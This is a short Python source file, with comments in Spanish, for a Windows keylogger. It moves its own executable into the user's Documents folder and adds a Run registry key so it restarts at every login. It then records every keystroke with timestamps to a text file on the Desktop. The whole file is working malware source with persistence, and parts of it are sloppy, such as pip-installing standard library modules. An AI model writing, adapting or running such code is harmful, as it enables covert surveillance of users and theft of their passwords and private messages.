try:
    import threading
    import shutil
    from pynput import keyboard 
    import os , wmi , sys
    import socket 
    from datetime import datetime
    import winreg , base64
except:
    os.system("pip install pynput")
    os.system("pip install wmi")
    os.system("pip install datetime")
    os.system("pip install winreg")
    os.system("pip install shutil")
    os.system("pip install base64")
    os.system("pip install threading")
    os.system("cls")




def reinicio():
   
    #PODEMOS USAR DOS  RUTAS sys.executable o sys.argv[0] PARA ENCONTAR EL EXE Y EL NOMBE
    shutil.move(f"{sys.argv[0]}",f"C:\\Users\\{os.getenv("UserName")}\\Documents\\{"".join(os.path.splitext(os.path.basename(sys.argv[0])))}")
    keyy = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(keyy, f"{os.getenv("UserName")}", 0, winreg.REG_SZ, f"C:\\Users\\{os.getenv("UserName")}\\Documents\\{"".join(os.path.splitext(os.path.basename(sys.argv[0])))}")
    winreg.CloseKey(keyy)
        
 
def prisionaero(key):
    try:
        hora = datetime.now()
        texto = hora.strftime("%B  %d/%m/%Y  %H:%M  TOSIX ATOMIX955")
        txt = open(f"C:\\Users\\{os.getenv("UserName")}\\Desktop\\systema.txt","a")#tenes que cambiar la ruta no te olvides de eso

        if key == keyboard.Key.f1:
            txt.write("SE TERMINO FIN MAÑANA ME VOY A DORMIR")
            return False

        elif key == keyboard.Key.space:
            txt.write(" ")

        elif key == keyboard.Key.enter:
            txt.write("\n" + "\n")
            txt.write("   " + texto)
            txt.write("\n" + "\n")
            
         

        txt.write(str(key.char))
        
       
    except AttributeError:
        pass


    

if __name__ == '__main__':
    timer_thread = threading.Thread(target=reinicio)
    timer_thread.start()

    with keyboard.Listener(on_press=prisionaero) as comienzo:
        comienzo.join()

    
    
    
        
